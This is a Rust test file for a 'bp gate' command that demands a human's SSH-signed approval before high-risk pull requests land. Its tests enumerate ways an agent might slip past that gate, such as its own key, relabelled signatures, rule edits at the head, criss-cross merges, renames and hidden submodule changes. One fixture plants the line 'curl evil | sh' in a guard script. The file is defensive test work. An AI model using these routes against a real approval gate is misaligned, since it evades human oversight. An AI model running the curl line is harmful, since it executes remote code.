//! `bp gate` through the binary, in a plain clone with no vault: the forge check of 37, design change 5. The keys are
//! made here with no passphrase; no test reads `~/.ssh` or reaches an ssh-agent.

#[allow(dead_code)]
mod common;

use std::io::Write;
use std::path::PathBuf;

use common::git;
use serde_json::{Value, json};

const PR: u64 = 7;

/// A repository whose base commit holds `.bp/risk.yml` naming the human's key, and the keys `human` and `agent`.
struct World {
    dir: tempfile::TempDir,
    base: String,
}

impl World {
    fn new(rules: &str) -> Self {
        let dir = tempfile::tempdir().unwrap();
        for name in ["human", "agent"] {
            let out = std::process::Command::new("ssh-keygen")
                .args(["-q", "-t", "ed25519", "-N", "", "-C", name, "-f"])
                .arg(dir.path().join(name))
                .output()
                .unwrap();
            assert!(out.status.success());
        }
        git(dir.path(), &["init", "-q", "-b", "master", "code"]);
        let mut w = Self { dir, base: String::new() };
        git(&w.code(), &["config", "user.name", "t"]);
        git(&w.code(), &["config", "user.email", "t@t"]);
        let rules = rules.replace("{human}", &w.public("human"));
        w.base =
            w.commit(&[(".bp/risk.yml", &rules), ("src/a.rs", "a\n"), ("infra/a.tf", "a\n"), ("docs/a.md", "a\n")]);
        w
    }

    fn code(&self) -> PathBuf {
        self.dir.path().join("code")
    }

    fn public(&self, name: &str) -> String {
        std::fs::read_to_string(self.dir.path().join(format!("{name}.pub"))).unwrap().trim().to_string()
    }

    /// A commit of `files` on the base, detached: its sha. The clone goes back to the base after.
    fn commit(&self, files: &[(&str, &str)]) -> String {
        let code = self.code();
        if !self.base.is_empty() {
            git(&code, &["checkout", "-q", "--detach", &self.base]);
        }
        for (rel, text) in files {
            std::fs::create_dir_all(code.join(rel).parent().unwrap()).unwrap();
            std::fs::write(code.join(rel), text).unwrap();
        }
        git(&code, &["add", "-A"]);
        git(&code, &["commit", "-qm", "c"]);
        let sha = git(&code, &["rev-parse", "HEAD"]).trim().to_string();
        if !self.base.is_empty() {
            git(&code, &["checkout", "-q", "--detach", &self.base]);
        }
        sha
    }

    /// The comment `bp approve` posts: the message `bp approve` signs for these fields, signed by `key`.
    fn comment(&self, key: &str, fields: [&str; 6], signed: [&str; 6]) -> String {
        let text = |f: [&str; 6]| {
            let names = ["act", "project", "node", "pull_request", "base", "head"];
            names.iter().zip(f).flat_map(|(k, v)| [k, ": ", v, "\n"]).collect::<String>()
        };
        // A message on stdin signs to stdout, so no `.sig` file of an earlier call is kept.
        let mut child = std::process::Command::new("ssh-keygen")
            .env_remove("SSH_AUTH_SOCK")
            .args(["-Y", "sign", "-n", "bp", "-f"])
            .arg(self.dir.path().join(key))
            .stdin(std::process::Stdio::piped())
            .stdout(std::process::Stdio::piped())
            .spawn()
            .unwrap();
        child.stdin.take().unwrap().write_all(text(signed).as_bytes()).unwrap();
        let out = child.wait_with_output().unwrap();
        assert!(out.status.success());
        let sig = String::from_utf8(out.stdout).unwrap();
        format!("Signed.\n\n```bp-approval\n{}{}\n```\n", text(fields), sig.trim_end())
    }

    /// `bp gate` for `head` onto `master` from the clone, with `comments` written to a file when given.
    fn gate(&self, head: &str, comments: Option<&Value>) -> (Option<i32>, Value) {
        self.gate_onto("master", head, comments)
    }

    /// `bp gate` for `head` onto the branch `base_ref`, in a repository whose default branch is `master`.
    fn gate_onto(&self, base_ref: &str, head: &str, comments: Option<&Value>) -> (Option<i32>, Value) {
        let pr = PR.to_string();
        let mut args = vec!["gate", "--base", &self.base, "--base-ref", base_ref, "--default-ref", "master"];
        args.extend(["--head", head, "--pr", &pr, "--project", "bp"]);
        let path = self.dir.path().join("comments.json");
        let path_text = path.display().to_string();
        if let Some(c) = comments {
            std::fs::write(&path, c.to_string()).unwrap();
            args.extend(["--comments", &path_text]);
        }
        common::bp_env(&self.code(), &[("SSH_AUTH_SOCK", "")], &args)
    }
}

const RULES: &str = "high: [infra/]\nlow: [docs/]\nsigner: {human}\ngate: 0123456789abcdef0123456789abcdef01234567\n";

const ISSUE: &str = "projects/bp/issues/a";

/// The exit and the refusal code, `""` for a pass.
fn code(out: &(Option<i32>, Value)) -> (Option<i32>, String) {
    (out.0, out.1["code"].as_str().unwrap_or_default().to_string())
}

fn at(f: &[String; 6]) -> [&str; 6] {
    [&f[0], &f[1], &f[2], &f[3], &f[4], &f[5]]
}

#[test]
fn gate_passes_low_and_medium_with_no_comment_and_no_vault() {
    let w = World::new(RULES);
    for (file, level) in [("docs/b.md", "low"), ("src/b.rs", "medium")] {
        let head = w.commit(&[(file, "b\n")]);
        let (exit, v) = w.gate(&head, None);
        assert_eq!((exit, v["level"].as_str(), v["approval"].as_str()), (Some(0), Some(level), Some("not_needed")));
        assert_eq!(
            (v["base"].as_str(), v["head"].as_str(), &v["pull_request"]),
            (Some(&*w.base), Some(&*head), &json!(PR))
        );
    }
    let (exit, v) = w.gate("abc", None);
    assert_eq!((exit, v["code"].as_str()), (Some(4), Some("usage")), "a head is a full sha: {v}");
}

#[test]
fn gate_needs_a_signed_approval_of_this_pull_request_and_head_for_high() {
    let w = World::new(RULES);
    let head = w.commit(&[("infra/b.tf", "b\n")]);
    let other = w.commit(&[("infra/c.tf", "c\n")]);
    let pr = PR.to_string();
    let ours = |h: &str| ["approve", "bp", ISSUE, &pr, "master", h].map(String::from);
    let good = ours(&head);
    let refused = |comments: Option<&Value>| code(&w.gate(&head, comments));

    let (exit, v) = w.gate(&head, None);
    assert_eq!((exit, v["code"].as_str()), (Some(2), "approval_missing".into()), "{v}");
    assert!(v["fix"].as_str().unwrap().contains("bp approve <issue> --post"), "{v}");
    assert_eq!(refused(Some(&json!([]))), (Some(2), "approval_missing".into()));

    // A valid signature of another head, or of another pull request, approves that one only.
    let stale = w.comment("human", at(&ours(&other)), at(&ours(&other)));
    let (exit, v) = w.gate(&head, Some(&json!([stale])));
    assert_eq!((exit, v["code"].as_str()), (Some(2), "approval_missing".into()), "{v}");
    assert!(v["fix"].as_str().unwrap().contains(&format!("the comments sign {other}")), "{v}");
    assert_eq!(code(&w.gate(&other, Some(&json!([stale])))), (Some(0), String::new()), "it passes the head it signed");
    let pr8 = ["approve", "bp", ISSUE, "8", "master", &head];
    assert_eq!(refused(Some(&json!([w.comment("human", pr8, pr8)]))), (Some(2), "approval_missing".into()));
    let elsewhere = ["approve", "mentat", "projects/mentat/issues/a", &pr, "master", &head];
    assert_eq!(refused(Some(&json!([w.comment("human", elsewhere, elsewhere)]))), (Some(2), "approval_missing".into()));

    // Each block at this head that an agent can make without the human's key refuses.
    let lower = ["lower", "bp", ISSUE, &pr, "master", &head];
    let stacked = ["approve", "bp", ISSUE, &pr, "bp/lower", &head];
    for (why, body) in [
        ("the agent's own key", w.comment("agent", at(&good), at(&good))),
        ("another head's signature, relabelled", w.comment("human", at(&good), at(&ours(&other)))),
        ("another pull request's signature, relabelled", w.comment("human", at(&good), pr8)),
        ("another act's signature, relabelled", w.comment("human", at(&good), lower)),
        // A stacked pull request retargeted to the default branch: the human signed the diff on the lower layer.
        ("another base branch's signature, relabelled", w.comment("human", at(&good), stacked)),
        ("another base branch's signature", w.comment("human", stacked, stacked)),
        ("an issue of another project", {
            let f = ["approve", "bp", "projects/mentat/issues/a", &pr, "master", &head];
            w.comment("human", f, f)
        }),
        ("another project's valid approval, relabelled", {
            let theirs = ["approve", "mentat", "projects/mentat/issues/a", &pr, "master", &head];
            w.comment("human", ["approve", "bp", "projects/mentat/issues/a", &pr, "master", &head], theirs)
        }),
        (
            "no signature",
            format!(
                "```bp-approval\nact: approve\nproject: bp\nnode: {ISSUE}\npull_request: {PR}\nbase: master\nhead: {head}\n```"
            ),
        ),
    ] {
        assert_eq!(refused(Some(&json!([body]))), (Some(2), "signature_invalid".into()), "{why}");
    }

    // The human's signature passes, beside forged ones, in `gh api`'s own shape: one array per page, CRLF line ends.
    let valid = w.comment("human", at(&good), at(&good)).replace('\n', "\r\n");
    let forged = w.comment("agent", at(&good), at(&good));
    let pages = format!("{}{}", json!([{ "body": forged }, { "body": null }]), json!([{ "body": valid }]));
    std::fs::write(w.dir.path().join("pages.json"), pages).unwrap();
    let path = w.dir.path().join("pages.json").display().to_string();
    let (exit, v) = common::bp_env(
        &w.code(),
        &[],
        &[
            "gate",
            "--base",
            &w.base,
            "--base-ref",
            "master",
            "--default-ref",
            "master",
            "--head",
            &head,
            "--pr",
            &pr,
            "--project",
            "bp",
            "--comments",
            &path,
        ],
    );
    assert_eq!((exit, v["level"].as_str(), v["approval"].as_str()), (Some(0), Some("high"), Some("signed")), "{v}");
}

#[test]
fn gate_reads_the_rules_and_the_signer_at_the_base_never_the_head() {
    let w = World::new(RULES);
    // The head drops `infra/` from the high paths and names the agent's key.
    let rules = format!("high: []\nlow: [docs/, infra/]\nsigner: {}\ngate: {}\n", w.public("agent"), "f".repeat(40));
    let head = w.commit(&[(".bp/risk.yml", &rules), ("infra/b.tf", "b\n")]);
    let pr = PR.to_string();
    let fields = ["approve", "bp", ISSUE, &pr, "master", &head];
    let (exit, v) = w.gate(&head, Some(&json!([w.comment("agent", fields, fields)])));
    assert_eq!((exit, v["code"].as_str()), (Some(2), "signature_invalid".into()), "the head's signer is not trusted");
    let (exit, v) = w.gate(&head, Some(&json!([w.comment("human", fields, fields)])));
    assert_eq!(exit, Some(0), "{v}");
    let reasons = v["reasons"].to_string();
    assert!(reasons.contains("infra/b.tf matches the high pattern infra/"), "the base's rules judge it: {v}");

    // A base with no signer passes no high head, whatever signer the head names.
    let w = World::new("high: [infra/]\ngate: 0123456789abcdef0123456789abcdef01234567\n");
    let rules = format!("signer: {}\n", w.public("human"));
    let head = w.commit(&[(".bp/risk.yml", &rules), ("src/b.rs", "b\n")]);
    let fields = ["approve", "bp", ISSUE, &pr, "master", &head];
    let (exit, v) = w.gate(&head, Some(&json!([w.comment("human", fields, fields)])));
    assert_eq!((exit, v["code"].as_str()), (Some(2), "signer_missing".into()), "{v}");
    assert_eq!(v["subject"].as_str(), Some(format!("{}:.bp/risk.yml", w.base).as_str()));
}

#[test]
fn gate_passes_high_onto_the_default_branch_only() {
    let w = World::new(RULES);
    let head = w.commit(&[("infra/b.tf", "b\n")]);
    let pr = PR.to_string();
    // The human signs the pull request while it is stacked on `bp/lower`. A pass there would belong to the commit,
    // and the commit could then be pushed to `master` with the lower layer in it: so it refuses, and names the fix.
    let stacked = ["approve", "bp", ISSUE, &pr, "bp/lower", &head];
    let comments = json!([w.comment("human", stacked, stacked)]);
    let (exit, v) = w.gate_onto("bp/lower", &head, Some(&comments));
    assert_eq!((exit, v["code"].as_str()), (Some(2), Some("approval_missing")), "{v}");
    assert!(v["fix"].as_str().unwrap().contains("retarget pull request 7 from bp/lower to master"), "{v}");
    // A low or medium head passes onto any branch: no signature is at stake.
    let medium = w.commit(&[("src/b.rs", "b\n")]);
    assert_eq!(code(&w.gate_onto("bp/lower", &medium, None)), (Some(0), String::new()));
    // Retargeted to `master`, the same head and comment refuse: the signature names the old base.
    assert_eq!(code(&w.gate_onto("master", &head, Some(&comments))), (Some(2), "signature_invalid".into()));
    let onto = ["approve", "bp", ISSUE, &pr, "master", &head];
    let both = json!([w.comment("human", stacked, stacked), w.comment("human", onto, onto)]);
    assert_eq!(code(&w.gate_onto("master", &head, Some(&both))), (Some(0), String::new()), "a new signature passes");
    for bad in ["", "a b", "master\nhead: x"] {
        assert_eq!(code(&w.gate_onto(bad, &head, Some(&both))), (Some(4), "usage".into()), "{bad:?}");
    }
    let path = w.dir.path().join("comments.json").display().to_string();
    let pr = PR.to_string();
    let args = ["gate", "--base", &w.base, "--base-ref", "master", "--default-ref", "a b", "--head", &head];
    let out =
        common::bp_env(&w.code(), &[], &[&args[..], &["--pr", &pr, "--project", "bp", "--comments", &path]].concat());
    assert_eq!(code(&out), (Some(4), "usage".into()), "{out:?}");
}

/// git in `dir` with both dates set, so that a test picks which of two merge bases git reads.
fn git_dated(dir: &std::path::Path, date: &str, args: &[&str]) -> String {
    let out = std::process::Command::new("git")
        .arg("-C")
        .arg(dir)
        .env("GIT_AUTHOR_DATE", date)
        .env("GIT_COMMITTER_DATE", date)
        .args(args)
        .output()
        .unwrap();
    assert!(out.status.success(), "git {args:?}: {}", String::from_utf8_lossy(&out.stderr));
    git(dir, &["rev-parse", "HEAD"]).trim().to_string()
}

#[test]
fn gate_judges_what_the_head_lands_not_the_diff_from_one_merge_base() {
    // Review row 10. `M0` on master stands for a signed change of the rules. The agent's branch starts before it,
    // merges master in, and puts the old rules back. With two merge bases, `base...head` reads from the later one.
    let w = World::new(RULES);
    let code_dir = w.code();
    let c = |rel: &str, text: &str, date: &str, msg: &str| {
        std::fs::create_dir_all(code_dir.join(rel).parent().unwrap()).unwrap();
        std::fs::write(code_dir.join(rel), text).unwrap();
        git(&code_dir, &["add", "-A"]);
        git_dated(&code_dir, date, &["commit", "-qm", msg])
    };
    let b0 = w.base.clone();
    git(&code_dir, &["checkout", "-q", "-B", "master", &b0]);
    let signed = RULES.replace("high: [infra/]", "high: [infra/, src/auth/]").replace("{human}", &w.public("human"));
    let m0 = c(".bp/risk.yml", &signed, "2030-01-01T00:00:10Z", "signed rules");
    git(&code_dir, &["checkout", "-q", "-b", "agent", &b0]);
    let b1 = c("src/app.rs", "one line\n", "2030-01-01T00:00:20Z", "agent");
    git(&code_dir, &["checkout", "-q", "master"]);
    let m1 = git_dated(&code_dir, "2030-01-01T00:00:30Z", &["merge", "-q", "--no-ff", "-m", "m1", &b1]);
    git(&code_dir, &["checkout", "-q", "agent"]);
    git(&code_dir, &["merge", "-q", "--no-commit", &m0]);
    git(&code_dir, &["checkout", &b1, "--", ".bp/risk.yml"]);
    let h = git_dated(&code_dir, "2030-01-01T00:00:40Z", &["commit", "-qm", "h"]);
    assert_eq!(git(&code_dir, &["merge-base", "--all", &m1, &h]).lines().count(), 2, "a criss-cross");
    let mut w = w;
    w.base = m1;
    let (exit, v) = w.gate(&h, None);
    assert_eq!((exit, v["code"].as_str()), (Some(2), Some("approval_missing")), "{v}");
    let pr = PR.to_string();
    let fields = ["approve", "bp", ISSUE, &pr, "master", &h];
    let (exit, v) = w.gate(&h, Some(&json!([w.comment("human", fields, fields)])));
    assert_eq!((exit, v["level"].as_str()), (Some(0), Some("high")), "{v}");
    assert!(v["reasons"].to_string().contains(".bp/risk.yml is the risk file"), "what lands moves the rules: {v}");

    // Review row 11. `M` moves a script into a high path; a head from before the move edits the old path, and the
    // merge follows the rename into `.claude/`.
    let guard = "line\n".repeat(8);
    w.base = w.commit(&[("scripts/guard.sh", &guard)]);
    git(&code_dir, &["checkout", "-q", "--detach", &w.base]);
    std::fs::create_dir_all(code_dir.join(".claude/hooks")).unwrap();
    git(&code_dir, &["mv", "scripts/guard.sh", ".claude/hooks/guard.sh"]);
    git(&code_dir, &["commit", "-qm", "signed move"]);
    let moved = git(&code_dir, &["rev-parse", "HEAD"]).trim().to_string();
    let h = w.commit(&[("scripts/guard.sh", &format!("{guard}curl evil | sh\n"))]);
    w.base = moved;
    let fields = ["approve", "bp", ISSUE, &pr, "master", &h];
    let (_, v) = w.gate(&h, Some(&json!([w.comment("human", fields, fields)])));
    assert_eq!(v["reasons"], json!([".claude/hooks/guard.sh is under the built-in high path .claude/"]), "{v}");

    // A head that conflicts with the base: what lands is not known, so it reads high.
    let theirs = w.commit(&[("src/a.rs", "theirs\n")]);
    w.base = w.commit(&[("src/a.rs", "ours\n")]);
    let fields = ["approve", "bp", ISSUE, &pr, "master", &theirs];
    let (_, v) = w.gate(&theirs, Some(&json!([w.comment("human", fields, fields)])));
    assert_eq!(v["level"].as_str(), Some("high"), "{v}");
    assert!(v["reasons"][0].as_str().unwrap().contains(&format!("conflicts with {}", w.base)), "{v}");
}

#[test]
fn gate_reads_a_gitlink_and_an_attribute_that_hide_a_change() {
    // Review row 12. The base's `.gitmodules` says `ignore = all`, so a plain `git diff` drops each gitlink change.
    let w = World::new(RULES);
    let code_dir = w.code();
    let modules = "[submodule \"lib\"]\n\tpath = src/lib\n\turl = ./lib\n\tignore = all\n\
                   [submodule \"skills\"]\n\tpath = docs/skills\n\turl = ./skills\n\tignore = all\n";
    let link = |base: &str, path: &str, sha: &str| {
        git(&code_dir, &["checkout", "-q", "--detach", base]);
        git(&code_dir, &["update-index", "--add", "--cacheinfo", &format!("160000,{sha},{path}")]);
        git(&code_dir, &["commit", "-qm", "link"]);
        git(&code_dir, &["rev-parse", "HEAD"]).trim().to_string()
    };
    let mut w = w;
    w.base = w.commit(&[(".gitmodules", modules), (".gitattributes", "docs/** -diff\n")]);
    w.base = link(&w.base.clone(), "src/lib", &"1".repeat(40));
    git(&code_dir, &["checkout", "-q", "--detach", &w.base]);
    let pr = PR.to_string();
    for (head, says) in [
        (link(&w.base.clone(), "src/lib", &"2".repeat(40)), "src/lib is a submodule commit"),
        (link(&w.base.clone(), "docs/skills", &"3".repeat(40)), "docs/skills is a submodule commit"),
    ] {
        git(&code_dir, &["checkout", "-q", "--detach", &w.base]);
        let fields = ["approve", "bp", ISSUE, &pr, "master", &head];
        let (_, v) = w.gate(&head, Some(&json!([w.comment("human", fields, fields)])));
        assert_eq!((v["level"].as_str(), v["reasons"][0].as_str()), (Some("high"), Some(says)), "{v}");
    }
    // Review row 19. The base marks `docs/**` `-diff`, so git counts no line of a big change under the low pattern.
    let big = "a line\n".repeat(1000);
    let head = w.commit(&[("docs/a.md", &big)]);
    let fields = ["approve", "bp", ISSUE, &pr, "master", &head];
    let (_, v) = w.gate(&head, Some(&json!([w.comment("human", fields, fields)])));
    assert_eq!(v["reasons"], json!(["size unknown: docs/a.md"]), "{v}");
}
#[test]
fn gate_refuses_a_base_with_no_pin_of_its_own_build() {
    // The workflow builds `bp` from the pin it reads at the base, so a base with no pin, or a bad one, has no gate.
    for rules in ["high: [infra/]\nsigner: {human}\n", "signer: {human}\ngate: abc\n", ""] {
        let w = World::new(rules);
        let head = w.commit(&[("docs/b.md", "b\n")]);
        let (exit, v) = w.gate(&head, None);
        assert_eq!((exit, v["code"].as_str()), (Some(2), Some("risk_file_invalid")), "{rules:?}: {v}");
        assert_eq!(v["subject"].as_str(), Some(format!("{}:.bp/risk.yml", w.base).as_str()), "{v}");
    }
    // The head's pin is not read: a head that adds one to a base with none still refuses.
    let w = World::new("signer: {human}\n");
    let head = w.commit(&[(".bp/risk.yml", &format!("signer: {}\ngate: {}\n", w.public("human"), "f".repeat(40)))]);
    assert_eq!(code(&w.gate(&head, None)), (Some(2), "risk_file_invalid".into()));
}
